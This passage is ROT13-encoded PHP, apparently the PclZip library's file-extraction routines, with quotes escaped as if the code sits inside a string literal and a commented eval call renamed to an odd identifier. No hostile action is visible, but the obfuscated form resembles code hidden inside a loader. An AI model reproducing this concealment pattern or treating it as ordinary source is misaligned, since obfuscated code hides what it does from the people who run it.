              ryfrvs ($i_urnqre['fgberq_svyranzr'] == $c_bcgvbaf[CPYMVC_BCG_OL_ANZR][$w]) {
                  $i_rkgenpg = gehr;
              }
          }
      }

      // ----- Ybbx sbe rkgenpg ol rert ehyr
      // rert() vf qrcerpngrq jvgu CUC 5.3
      /*
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_RERT]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_RERT] != \"\")) {

          vs (rert($c_bcgvbaf[CPYMVC_BCG_OL_RERT], $i_urnqre['fgberq_svyranzr'])) {
              $i_rkgenpg = gehr;
          }
      }
      */

      // ----- Ybbx sbe rkgenpg ol cert ehyr
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_CERT]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_CERT] != \"\")) {

          vs (cert_zngpu($c_bcgvbaf[CPYMVC_BCG_OL_CERT], $i_urnqre['fgberq_svyranzr'])) {
              $i_rkgenpg = gehr;
          }
      }

      // ----- Ybbx sbe rkgenpg ol vaqrk ehyr
      ryfr vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK]))
               && ($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK] != 0)) {

          // ----- Ybbx vs gur vaqrk vf va gur yvfg
          sbe ($w=$w_fgneg; ($w<fvmrbs($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK])) && (!$i_rkgenpg); $w++) {

              vs (($v>=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['fgneg']) && ($v<=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['raq'])) {
                  $i_rkgenpg = gehr;
              }
              vs ($v>=$c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['raq']) {
                  $w_fgneg = $w+1;
              }

              vs ($c_bcgvbaf[CPYMVC_BCG_OL_VAQRK][$w]['fgneg']>$v) {
                  oernx;
              }
          }
      }

      // ----- Ybbx sbe ab ehyr, juvpu zrnaf rkgenpg nyy gur nepuvir
      ryfr {
          $i_rkgenpg = gehr;
      }

	  // ----- Purpx pbzcerffvba zrgubq
	  vs (   ($i_rkgenpg)
	      && (   ($i_urnqre['pbzcerffvba'] != 8)
		      && ($i_urnqre['pbzcerffvba'] != 0))) {
          $i_urnqre['fgnghf'] = 'hafhccbegrq_pbzcerffvba';

          // ----- Ybbx sbe CPYMVC_BCG_FGBC_BA_REEBE
          vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]))
		      && ($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]===gehr)) {

              $guvf->ceviFjncOnpxZntvpDhbgrf();

              CpyMvc::ceviReebeYbt(CPYMVC_REE_HAFHCCBEGRQ_PBZCERFFVBA,
			                       \"Svyranzr '\".$i_urnqre['fgberq_svyranzr'].\"' vf \"
				  	    	  	   .\"pbzcerffrq ol na hafhccbegrq pbzcerffvba \"
				  	    	  	   .\"zrgubq (\".$i_urnqre['pbzcerffvba'].\") \");

              erghea CpyMvc::reebePbqr();
		  }
	  }

	  // ----- Purpx rapelcgrq svyrf
	  vs (($i_rkgenpg) && (($i_urnqre['synt'] & 1) == 1)) {
          $i_urnqre['fgnghf'] = 'hafhccbegrq_rapelcgvba';

          // ----- Ybbx sbe CPYMVC_BCG_FGBC_BA_REEBE
          vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]))
		      && ($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]===gehr)) {

              $guvf->ceviFjncOnpxZntvpDhbgrf();

              CpyMvc::ceviReebeYbt(CPYMVC_REE_HAFHCCBEGRQ_RAPELCGVBA,
			                       \"Hafhccbegrq rapelcgvba sbe \"
				  	    	  	   .\" svyranzr '\".$i_urnqre['fgberq_svyranzr']
								   .\"'\");

              erghea CpyMvc::reebePbqr();
		  }
    }

      // ----- Ybbx sbe erny rkgenpgvba
      vs (($i_rkgenpg) && ($i_urnqre['fgnghf'] != 'bx')) {
          $i_erfhyg = $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre,
		                                        $c_svyr_yvfg[$i_ao_rkgenpgrq++]);
          vs ($i_erfhyg != 1) {
              $guvf->ceviPybfrSq();
              $guvf->ceviFjncOnpxZntvpDhbgrf();
              erghea $i_erfhyg;
          }

          $i_rkgenpg = snyfr;
      }

      // ----- Ybbx sbe erny rkgenpgvba
      vs ($i_rkgenpg)
      {

        // ----- Tb gb gur svyr cbfvgvba
        @erjvaq($guvf->mvc_sq);
        vs (@sfrrx($guvf->mvc_sq, $i_urnqre['bssfrg']))
        {
          // ----- Pybfr gur mvc svyr
          $guvf->ceviPybfrSq();

          $guvf->ceviFjncOnpxZntvpDhbgrf();

          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NEPUVIR_MVC, 'Vainyvq nepuvir fvmr');

          // ----- Erghea
          erghea CpyMvc::reebePbqr();
        }

        // ----- Ybbx sbe rkgenpgvba nf fgevat
        vs ($c_bcgvbaf[CPYMVC_BCG_RKGENPG_NF_FGEVAT]) {

          $i_fgevat = '';

          // ----- Rkgenpgvat gur svyr
          $i_erfhyg1 = $guvf->ceviRkgenpgSvyrNfFgevat($i_urnqre, $i_fgevat, $c_bcgvbaf);
          vs ($i_erfhyg1 < 1) {
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();
            erghea $i_erfhyg1;
          }

          // ----- Trg gur bayl vagrerfgvat nggevohgrf
          vs (($i_erfhyg = $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre, $c_svyr_yvfg[$i_ao_rkgenpgrq])) != 1)
          {
            // ----- Pybfr gur mvc svyr
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();

            erghea $i_erfhyg;
          }

          // ----- Frg gur svyr pbagrag
          $c_svyr_yvfg[$i_ao_rkgenpgrq]['pbagrag'] = $i_fgevat;

          // ----- Arkg rkgenpgrq svyr
          $i_ao_rkgenpgrq++;

          // ----- Ybbx sbe hfre pnyyonpx nobeg
          vs ($i_erfhyg1 == 2) {
          	oernx;
          }
        }
        // ----- Ybbx sbe rkgenpgvba va fgnaqneq bhgchg
        ryfrvs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_RKGENPG_VA_BHGCHG]))
		        && ($c_bcgvbaf[CPYMVC_BCG_RKGENPG_VA_BHGCHG])) {
          // ----- Rkgenpgvat gur svyr va fgnaqneq bhgchg
          $i_erfhyg1 = $guvf->ceviRkgenpgSvyrVaBhgchg($i_urnqre, $c_bcgvbaf);
          vs ($i_erfhyg1 < 1) {
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();
            erghea $i_erfhyg1;
          }

          // ----- Trg gur bayl vagrerfgvat nggevohgrf
          vs (($i_erfhyg = $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre, $c_svyr_yvfg[$i_ao_rkgenpgrq++])) != 1) {
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();
            erghea $i_erfhyg;
          }

          // ----- Ybbx sbe hfre pnyyonpx nobeg
          vs ($i_erfhyg1 == 2) {
          	oernx;
          }
        }
        // ----- Ybbx sbe abezny rkgenpgvba
        ryfr {
          // ----- Rkgenpgvat gur svyr
          $i_erfhyg1 = $guvf->ceviRkgenpgSvyr($i_urnqre,
		                                      $c_cngu, $c_erzbir_cngu,
											  $c_erzbir_nyy_cngu,
											  $c_bcgvbaf);
          vs ($i_erfhyg1 < 1) {
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();
            erghea $i_erfhyg1;
          }

          // ----- Trg gur bayl vagrerfgvat nggevohgrf
          vs (($i_erfhyg = $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre, $c_svyr_yvfg[$i_ao_rkgenpgrq++])) != 1)
          {
            // ----- Pybfr gur mvc svyr
            $guvf->ceviPybfrSq();
            $guvf->ceviFjncOnpxZntvpDhbgrf();

            erghea $i_erfhyg;
          }

          // ----- Ybbx sbe hfre pnyyonpx nobeg
          vs ($i_erfhyg1 == 2) {
          	oernx;
          }
        }
      }
    }

    // ----- Pybfr gur mvc svyr
    $guvf->ceviPybfrSq();
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviRkgenpgSvyr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  //
  // 1 : ... ?
  // CPYMVC_REE_HFRE_NOBEGRQ(2) : Hfre nfx sbe rkgenpgvba fgbc va pnyyonpx
  // --------------------------------------------------------------------------------
  shapgvba ceviRkgenpgSvyr(&$c_ragel, $c_cngu, $c_erzbir_cngu, $c_erzbir_nyy_cngu, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Ernq gur svyr urnqre
    vs (($i_erfhyg = $guvf->ceviErnqSvyrUrnqre($i_urnqre)) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }


    // ----- Purpx gung gur svyr urnqre vf pburerag jvgu $c_ragel vasb
    vs ($guvf->ceviPurpxSvyrUrnqref($i_urnqre, $c_ragel) != 1) {
        // GOP
    }

    // ----- Ybbx sbe nyy cngu gb erzbir
    vs ($c_erzbir_nyy_cngu == gehr) {
        // ----- Ybbx sbe sbyqre ragel gung abg arrq gb or rkgenpgrq
        vs (($c_ragel['rkgreany']&0k00000010)==0k00000010) {

            $c_ragel['fgnghf'] = \"svygrerq\";

            erghea $i_erfhyg;
        }

        // ----- Trg gur onfranzr bs gur cngu
        $c_ragel['svyranzr'] = onfranzr($c_ragel['svyranzr']);
    }

    // ----- Ybbx sbe cngu gb erzbir
    ryfr vs ($c_erzbir_cngu != \"\")
    {
      vs (CpyMvcHgvyCnguVapyhfvba($c_erzbir_cngu, $c_ragel['svyranzr']) == 2)
      {

        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"svygrerq\";

        // ----- Erghea
        erghea $i_erfhyg;
      }

      $c_erzbir_cngu_fvmr = fgeyra($c_erzbir_cngu);
      vs (fhofge($c_ragel['svyranzr'], 0, $c_erzbir_cngu_fvmr) == $c_erzbir_cngu)
      {

        // ----- Erzbir gur cngu
        $c_ragel['svyranzr'] = fhofge($c_ragel['svyranzr'], $c_erzbir_cngu_fvmr);

      }
    }

    // ----- Nqq gur cngu
    vs ($c_cngu != '') {
      $c_ragel['svyranzr'] = $c_cngu.\"/\".$c_ragel['svyranzr'];
    }

    // ----- Purpx n onfr_qve_erfgevpgvba
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA])) {
      $i_vapyhfvba
      = CpyMvcHgvyCnguVapyhfvba($c_bcgvbaf[CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA],
                                $c_ragel['svyranzr']);
      vs ($i_vapyhfvba == 0) {

        CpyMvc::ceviReebeYbt(CPYMVC_REE_QVERPGBEL_ERFGEVPGVBA,
			                     \"Svyranzr '\".$c_ragel['svyranzr'].\"' vf \"
								 .\"bhgfvqr CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA\");

        erghea CpyMvc::reebePbqr();
      }
    }

    // ----- Ybbx sbe cer-rkgenpg pnyyonpx
    vs (vffrg($c_bcgvbaf[CPYMVC_PO_CER_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CER_RKGENPG](CPYMVC_PO_CER_RKGENPG, $i_ybpny_urnqre);
      vs ($i_erfhyg == 0) {
        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"fxvccrq\";
        $i_erfhyg = 1;
      }

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
        // ----- Guvf fgnghf vf vagreany naq jvyy or punatrq va 'fxvccrq'
        $c_ragel['fgnghf'] = \"nobegrq\";
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }

      // ----- Hcqngr gur vasbezngvba
      // Bayl fbzr svryqf pna or zbqvsvrq
      $c_ragel['svyranzr'] = $i_ybpny_urnqre['svyranzr'];
    }


    // ----- Ybbx vs rkgenpgvba fubhyq or qbar
    vs ($c_ragel['fgnghf'] == 'bx') {

    // ----- Ybbx sbe fcrpvsvp npgvbaf juvyr gur svyr rkvfg
    vs (svyr_rkvfgf($c_ragel['svyranzr']))
    {

      // ----- Ybbx vs svyr vf n qverpgbel
      vs (vf_qve($c_ragel['svyranzr']))
      {

        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"nyernql_n_qverpgbel\";

        // ----- Ybbx sbe CPYMVC_BCG_FGBC_BA_REEBE
        // Sbe uvfgbevpny ernfba svefg CpyMvc vzcyrzragngvba qbrf abg fgbc
        // jura guvf xvaq bs reebe bpphef.
        vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]))
		    && ($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]===gehr)) {

            CpyMvc::ceviReebeYbt(CPYMVC_REE_NYERNQL_N_QVERPGBEL,
			                     \"Svyranzr '\".$c_ragel['svyranzr'].\"' vf \"
								 .\"nyernql hfrq ol na rkvfgvat qverpgbel\");

            erghea CpyMvc::reebePbqr();
		    }
      }
      // ----- Ybbx vs svyr vf jevgr cebgrpgrq
      ryfr vs (!vf_jevgrnoyr($c_ragel['svyranzr']))
      {

        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"jevgr_cebgrpgrq\";

        // ----- Ybbx sbe CPYMVC_BCG_FGBC_BA_REEBE
        // Sbe uvfgbevpny ernfba svefg CpyMvc vzcyrzragngvba qbrf abg fgbc
        // jura guvf xvaq bs reebe bpphef.
        vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]))
		    && ($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]===gehr)) {

            CpyMvc::ceviReebeYbt(CPYMVC_REE_JEVGR_BCRA_SNVY,
			                     \"Svyranzr '\".$c_ragel['svyranzr'].\"' rkvfgf \"
								 .\"naq vf jevgr cebgrpgrq\");

            erghea CpyMvc::reebePbqr();
		    }
      }

      // ----- Ybbx vs gur rkgenpgrq svyr vf byqre
      ryfr vs (svyrzgvzr($c_ragel['svyranzr']) > $c_ragel['zgvzr'])
      {
        // ----- Punatr gur svyr fgnghf
        vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_ERCYNPR_ARJRE]))
		    && ($c_bcgvbaf[CPYMVC_BCG_ERCYNPR_ARJRE]===gehr)) {
	  	  }
		    ryfr {
            $c_ragel['fgnghf'] = \"arjre_rkvfg\";

            // ----- Ybbx sbe CPYMVC_BCG_FGBC_BA_REEBE
            // Sbe uvfgbevpny ernfba svefg CpyMvc vzcyrzragngvba qbrf abg fgbc
            // jura guvf xvaq bs reebe bpphef.
            vs (   (vffrg($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]))
		        && ($c_bcgvbaf[CPYMVC_BCG_FGBC_BA_REEBE]===gehr)) {

                CpyMvc::ceviReebeYbt(CPYMVC_REE_JEVGR_BCRA_SNVY,
			             \"Arjre irefvba bs '\".$c_ragel['svyranzr'].\"' rkvfgf \"
					    .\"naq bcgvba CPYMVC_BCG_ERCYNPR_ARJRE vf abg fryrpgrq\");

                erghea CpyMvc::reebePbqr();
		      }
		    }
      }
      ryfr {
      }
    }

    // ----- Purpx gur qverpgbel ninvynovyvgl naq perngr vg vs arprffnel
    ryfr {
      vs ((($c_ragel['rkgreany']&0k00000010)==0k00000010) || (fhofge($c_ragel['svyranzr'], -1) == '/'))
        $i_qve_gb_purpx = $c_ragel['svyranzr'];
      ryfr vs (!fgefge($c_ragel['svyranzr'], \"/\"))
        $i_qve_gb_purpx = \"\";
      ryfr
        $i_qve_gb_purpx = qveanzr($c_ragel['svyranzr']);

        vs (($i_erfhyg = $guvf->ceviQvePurpx($i_qve_gb_purpx, (($c_ragel['rkgreany']&0k00000010)==0k00000010))) != 1) {

          // ----- Punatr gur svyr fgnghf
          $c_ragel['fgnghf'] = \"cngu_perngvba_snvy\";

          // ----- Erghea
          //erghea $i_erfhyg;
          $i_erfhyg = 1;
        }
      }
    }

    // ----- Ybbx vs rkgenpgvba fubhyq or qbar
    vs ($c_ragel['fgnghf'] == 'bx') {

      // ----- Qb gur rkgenpgvba (vs abg n sbyqre)
      vs (!(($c_ragel['rkgreany']&0k00000010)==0k00000010))
      {
        // ----- Ybbx sbe abg pbzcerffrq svyr
        vs ($c_ragel['pbzcerffvba'] == 0) {

    		  // ----- Bcravat qrfgvangvba svyr
          vs (($i_qrfg_svyr = @sbcra($c_ragel['svyranzr'], 'jo')) == 0)
          {

            // ----- Punatr gur svyr fgnghf
            $c_ragel['fgnghf'] = \"jevgr_reebe\";

            // ----- Erghea
            erghea $i_erfhyg;
          }


          // ----- Ernq gur svyr ol CPYMVC_ERNQ_OYBPX_FVMR bpgrgf oybpxf
          $i_fvmr = $c_ragel['pbzcerffrq_fvmr'];
          juvyr ($i_fvmr != 0)
          {
            $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
            $i_ohssre = @sernq($guvf->mvc_sq, $i_ernq_fvmr);
            /* Gel gb fcrrq hc gur pbqr
            $i_ovanel_qngn = cnpx('n'.$i_ernq_fvmr, $i_ohssre);
            @sjevgr($i_qrfg_svyr, $i_ovanel_qngn, $i_ernq_fvmr);
            */
            @sjevgr($i_qrfg_svyr, $i_ohssre, $i_ernq_fvmr);
            $i_fvmr -= $i_ernq_fvmr;
          }

          // ----- Pybfvat gur qrfgvangvba svyr
          spybfr($i_qrfg_svyr);

          // ----- Punatr gur svyr zgvzr
          gbhpu($c_ragel['svyranzr'], $c_ragel['zgvzr']);


        }
        ryfr {
          // ----- GOP
          // Arrq gb or svavfurq
          vs (($c_ragel['synt'] & 1) == 1) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_HAFHCCBEGRQ_RAPELCGVBA, 'Svyr \''.$c_ragel['svyranzr'].'\' vf rapelcgrq. Rapelcgrq svyrf ner abg fhccbegrq.');
            erghea CpyMvc::reebePbqr();
          }


          // ----- Ybbx sbe hfvat grzcbenel svyr gb hamvc
          vs ( (!vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_BSS]))
              && (vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_BA])
                  || (vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ])
                      && ($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ] <= $c_ragel['fvmr'])) ) ) {
            $i_erfhyg = $guvf->ceviRkgenpgSvyrHfvatGrzcSvyr($c_ragel, $c_bcgvbaf);
            vs ($i_erfhyg < CPYMVC_REE_AB_REEBE) {
              erghea $i_erfhyg;
            }
          }

          // ----- Ybbx sbe rkgenpg va zrzbel
          ryfr {


            // ----- Ernq gur pbzcerffrq svyr va n ohssre (bar fubg)
            vs ($c_ragel['pbzcerffrq_fvmr'] > 0) {
              $i_ohssre = @sernq($guvf->mvc_sq, $c_ragel['pbzcerffrq_fvmr']);
            }
            ryfr {
              $i_ohssre = '';
            }

            // ----- Qrpbzcerff gur svyr
            $i_svyr_pbagrag = @tmvasyngr($i_ohssre);
            hafrg($i_ohssre);
            vs ($i_svyr_pbagrag === SNYFR) {

              // ----- Punatr gur svyr fgnghf
              // GOP
              $c_ragel['fgnghf'] = \"reebe\";

              erghea $i_erfhyg;
            }

            // ----- Bcravat qrfgvangvba svyr
            vs (($i_qrfg_svyr = @sbcra($c_ragel['svyranzr'], 'jo')) == 0) {

              // ----- Punatr gur svyr fgnghf
              $c_ragel['fgnghf'] = \"jevgr_reebe\";

              erghea $i_erfhyg;
            }

            // ----- Jevgr gur hapbzcerffrq qngn
            @sjevgr($i_qrfg_svyr, $i_svyr_pbagrag, $c_ragel['fvmr']);
            hafrg($i_svyr_pbagrag);

            // ----- Pybfvat gur qrfgvangvba svyr
            @spybfr($i_qrfg_svyr);

          }

          // ----- Punatr gur svyr zgvzr
          @gbhpu($c_ragel['svyranzr'], $c_ragel['zgvzr']);
        }

        // ----- Ybbx sbe puzbq bcgvba
        vs (vffrg($c_bcgvbaf[CPYMVC_BCG_FRG_PUZBQ])) {

          // ----- Punatr gur zbqr bs gur svyr
          @puzbq($c_ragel['svyranzr'], $c_bcgvbaf[CPYMVC_BCG_FRG_PUZBQ]);
        }

      }
    }

  	// ----- Punatr nobeg fgnghf
  	vs ($c_ragel['fgnghf'] == \"nobegrq\") {
        $c_ragel['fgnghf'] = \"fxvccrq\";
  	}

    // ----- Ybbx sbe cbfg-rkgenpg pnyyonpx
    ryfrvs (vffrg($c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG](CPYMVC_PO_CBFG_RKGENPG, $i_ybpny_urnqre);

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviRkgenpgSvyrHfvatGrzcSvyr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviRkgenpgSvyrHfvatGrzcSvyr(&$c_ragel, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Perngrf n grzcbenel svyr
    $i_tmvc_grzc_anzr = CPYMVC_GRZCBENEL_QVE.havdvq('cpymvc-').'.tm';
    vs (($i_qrfg_svyr = @sbcra($i_tmvc_grzc_anzr, \"jo\")) == 0) {
      spybfr($i_svyr);
      CpyMvc::ceviReebeYbt(CPYMVC_REE_JEVGR_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' va ovanel jevgr zbqr');
      erghea CpyMvc::reebePbqr();
    }


    // ----- Jevgr tm svyr sbezng urnqre
    $i_ovanel_qngn = cnpx('in1n1In1n1', 0k8o1s, Pue($c_ragel['pbzcerffvba']), Pue(0k00), gvzr(), Pue(0k00), Pue(3));
    @sjevgr($i_qrfg_svyr, $i_ovanel_qngn, 10);

    // ----- Ernq gur svyr ol CPYMVC_ERNQ_OYBPX_FVMR bpgrgf oybpxf
    $i_fvmr = $c_ragel['pbzcerffrq_fvmr'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($guvf->mvc_sq, $i_ernq_fvmr);
      //$i_ovanel_qngn = cnpx('n'.$i_ernq_fvmr, $i_ohssre);
      @sjevgr($i_qrfg_svyr, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Jevgr tm svyr sbezng sbbgre
    $i_ovanel_qngn = cnpx('II', $c_ragel['pep'], $c_ragel['fvmr']);
    @sjevgr($i_qrfg_svyr, $i_ovanel_qngn, 8);

    // ----- Pybfr gur grzcbenel svyr
    @spybfr($i_qrfg_svyr);

    // ----- Bcravat qrfgvangvba svyr
    vs (($i_qrfg_svyr = @sbcra($c_ragel['svyranzr'], 'jo')) == 0) {
      $c_ragel['fgnghf'] = \"jevgr_reebe\";
      erghea $i_erfhyg;
    }

    // ----- Bcra gur grzcbenel tm svyr
    vs (($i_fep_svyr = @tmbcra($i_tmvc_grzc_anzr, 'eo')) == 0) {
      @spybfr($i_qrfg_svyr);
      $c_ragel['fgnghf'] = \"ernq_reebe\";
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_tmvc_grzc_anzr.'\' va ovanel ernq zbqr');
      erghea CpyMvc::reebePbqr();
    }


    // ----- Ernq gur svyr ol CPYMVC_ERNQ_OYBPX_FVMR bpgrgf oybpxf
    $i_fvmr = $c_ragel['fvmr'];
    juvyr ($i_fvmr != 0) {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @tmernq($i_fep_svyr, $i_ernq_fvmr);
      //$i_ovanel_qngn = cnpx('n'.$i_ernq_fvmr, $i_ohssre);
      @sjevgr($i_qrfg_svyr, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }
    @spybfr($i_qrfg_svyr);
    @tmpybfr($i_fep_svyr);

    // ----- Qryrgr gur grzcbenel svyr
    @hayvax($i_tmvc_grzc_anzr);

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviRkgenpgSvyrVaBhgchg()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviRkgenpgSvyrVaBhgchg(&$c_ragel, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Ernq gur svyr urnqre
    vs (($i_erfhyg = $guvf->ceviErnqSvyrUrnqre($i_urnqre)) != 1) {
      erghea $i_erfhyg;
    }


    // ----- Purpx gung gur svyr urnqre vf pburerag jvgu $c_ragel vasb
    vs ($guvf->ceviPurpxSvyrUrnqref($i_urnqre, $c_ragel) != 1) {
        // GOP
    }

    // ----- Ybbx sbe cer-rkgenpg pnyyonpx
    vs (vffrg($c_bcgvbaf[CPYMVC_PO_CER_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_ragel, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
//      __sa_29941('$i_erfhyg = '.$c_bcgvbaf[CPYMVC_PO_CER_RKGENPG].'(CPYMVC_PO_CER_RKGENPG, $i_ybpny_urnqre);');
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CER_RKGENPG](CPYMVC_PO_CER_RKGENPG, $i_ybpny_urnqre);
      vs ($i_erfhyg == 0) {
        // ----- Punatr gur svyr fgnghf
        $c_ragel['fgnghf'] = \"fxvccrq\";
        $i_erfhyg = 1;
      }

      // ----- Ybbx sbe nobeg erfhyg
      vs ($i_erfhyg == 2) {
        // ----- Guvf fgnghf vf vagreany naq jvyy or punatrq va 'fxvccrq'
        $c_ragel['fgnghf'] = \"nobegrq\";
      	$i_erfhyg = CPYMVC_REE_HFRE_NOBEGRQ;
      }

      // ----- Hcqngr gur vasbezngvba
      // Bayl fbzr svryqf pna or zbqvsvrq
      $c_ragel['svyranzr'] = $i_ybpny_urnqre['svyranzr'];
    }

    // ----- Genpr

    // ----- Ybbx vs rkgenpgvba fubhyq or qbar
    vs ($c_ragel['fgnghf'] == 'bx') {

      // ----- Qb gur rkgenpgvba (vs abg n sbyqre)
      vs (!(($c_ragel['rkgreany']&0k00000010)==0k00000010)) {
        // ----- Ybbx sbe abg pbzcerffrq svyr
        vs ($c_ragel['pbzcerffrq_fvmr'] == $c_ragel['fvmr']) {

          // ----- Ernq gur svyr va n ohssre (bar fubg)
          vs ($c_ragel['pbzcerffrq_fvmr'] > 0) {
            $i_ohssre = @sernq($guvf->mvc_sq, $c_ragel['pbzcerffrq_fvmr']);
          }
          ryfr {
            $i_ohssre = '';
          }

          // ----- Fraq gur svyr gb gur bhgchg
          rpub $i_ohssre;
          hafrg($i_ohssre);
        }
        ryfr {

          // ----- Ernq gur pbzcerffrq svyr va n ohssre (bar fubg)
          vs ($c_ragel['pbzcerffrq_fvmr'] > 0) {
            $i_ohssre = @sernq($guvf->mvc_sq, $c_ragel['pbzcerffrq_fvmr']);
          }
          ryfr {
            $i_ohssre = '';
          }

          // ----- Qrpbzcerff gur svyr
          $i_svyr_pbagrag = tmvasyngr($i_ohssre);
          hafrg($i_ohssre);

          // ----- Fraq gur svyr gb gur bhgchg
          rpub $i_svyr_pbagrag;
          hafrg($i_svyr_pbagrag);
        }
      }
    }

	// ----- Punatr nobeg fgnghf
	vs ($c_ragel['fgnghf'] == \"nobegrq\") {
      $c_ragel['fgnghf'] = \"fxvccrq\";
	}

    // ----- Ybbx sbe cbfg-rkgenpg pnyyonpx
    ryfrvs (vffrg($c_bcgvbaf[CPYMVC_PO_CBFG_RKGENPG])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
